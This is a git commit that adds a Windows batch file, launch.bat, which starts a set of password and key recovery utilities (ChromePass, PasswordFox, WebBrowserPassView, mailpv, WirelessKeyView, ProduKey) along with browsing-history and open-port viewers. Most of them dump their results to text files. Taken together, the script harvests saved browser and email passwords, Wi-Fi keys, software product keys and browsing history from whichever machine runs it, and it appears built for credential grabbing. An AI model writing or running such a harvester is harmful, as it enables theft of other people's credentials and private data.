fa05c9a46a72e0f079439cf01012c6406c92b9c4
Yextep <114537444+Yextep@users.noreply.github.com>
2023-09-09 09:11:08 -0600

    Add files via upload

---
+++ launch.bat
@@ -0,0 +1,8 @@
+start BrowsingHistoryView.exe /stext BrowsingHistoryView.txt
+start ChromePass.exe
+start cports.exe /stext cports.txt
+start mailpv.exe /stext mailpv.txt
+start PasswordFox.exe
+start ProduKey.exe /stext ProduKey.txt
+start WebBrowserPassView.exe
+start WirelessKeyView.exe /stext WirelessKeyView.txt
